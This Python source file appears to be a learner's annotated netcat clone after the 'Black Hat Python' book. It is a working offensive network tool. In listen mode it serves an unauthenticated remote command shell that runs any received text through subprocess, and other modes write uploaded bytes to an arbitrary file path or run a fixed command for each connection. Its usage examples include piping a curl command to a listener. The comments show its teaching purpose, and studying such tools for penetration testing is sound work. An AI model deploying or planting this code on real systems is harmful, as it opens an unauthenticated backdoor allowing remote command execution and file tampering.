import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading
import os

"""
This execute function takes the 'cmd' as an arguement.

Strips the cmd and passes it to the subprocess.check_output.

.check_output runs a command and returns the results in a subprocess/seperately.

Shlex.split handles the arguements given. Splits into a list.

stderr=subprocess.STDOUT is pointing errors to the standard output too.
"""

def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    return output.decode()

"""
This NetCat object serves multiple functions.

When this script is run it makes that instance the object.

Listener is one, connector is another instance.

socket.SO_REUSEADDR is for binding otherwise the listening port wont accept.

AF_INET and SOCK_STREAM makes a IPV4 TCP socket, SOCK_DGRAM makes UDP.
-
*So, if you pipe a command, the reciever upon binding will set up their connection using the args and the command in the buffer.
"""

class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    """
    Run function looks for arguements mainly -l to listen.
    If no -l is passed, then just send itself.
    """

    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

    """
    Send function creates a socket and connects to target.
    If there is already a buffer when establishing the socket, send that in the connection!
    """

    def send(self):
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)

        # Try a outer loop while connected.
        try:
            while True:

                # Each loop will try to recieve 4096 bytes until the length.

                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                if response:
                    print(response)
                    buffer = input("> ")
                    buffer += '\n'
                    self.socket.send(buffer.encode())

        # ctrl+D / ctrl+Z

        except KeyboardInterrupt:
            print("User terminated")
            self.socket.close()
            sys.exit()

    """
    When using -l you create an instanse of a listener.
    Socket listens to port/target specified when initialized.
    While bound. It will accept incoming connections.
    Creates a new thread and starts it.
    """
    
    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(target=self.handle, args=(client_socket,))
            client_thread.start()

    """
    Execute executes the output of the execute function, which takes a command e.g unix command.
    Upload sets up a file buffer and recieves upto 4096 bytes.
    Data variable will store the clients sent buffer upto the length of file_buffer.
    Opens a specified file and writes in the data, sends confirmation to client endpoint.
    Command will also set up a buffer. It will read in your typed command upto the '\n'.
    The response gets sent to the execute function which is a command on itself. 'whoami'.
    If so, thats how you get your command line output.
    """

    def handle(self, client_socket):
        
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())
        
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
                f.close()
                message = f'Appended. Your welcome.'
                print(message)
            client_socket.send(message.encode())

        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'BHP: #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f"Server killed. {e}")
                    self.socket.close()
                    sys.exit()

if __name__ == "__main__":

    parser = argparse.ArgumentParser(description='B.H.P Multi-Tool', formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent(
        """Instructions:

        NOTE: To access shell crtl+D on linux and ctrl+Z on Windows.
        
        Example:

        netcat_clone.py -t <IP> -p <PORT> -l -c
        netcat_clone.py -t <IP> -p <PORT> -l -u
        netcat_clone.py -t <IP> -p <PORT> -l -e
        echo 'ABC' | ./netcat_clone.py -t <IP> -p <PORT>
        echo 'curl <website>' | ./netcat_clone.py -t <IP> -p <PORT>

        
        """))
    
    # Arguements that can be parsed, built in.
    # 'metavar' removes the underscore text and defaults to blank string, it looks nicer.

    parser.add_argument('-c', '--command', action='store_true', help='Command to shell')
    parser.add_argument('-e', '--execute', help='Execute a command on the listener', metavar='')
    parser.add_argument('-l', '--listen', action='store_true', help='Listen')
    parser.add_argument('-p', '--port', type=int, default=9999, help='Port to interact', metavar='')
    parser.add_argument('-t', '--target', default='192.168.0.3', help='IP to interact', metavar='')
    parser.add_argument('-u', '--upload', help='Upload file to the target', metavar='')
    args = parser.parse_args()

    # If -l it initilizes in listening mode.
    # If not used with the -l command it sends the buffer.

    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()

    nc = NetCat(args, buffer.encode())
    nc.run()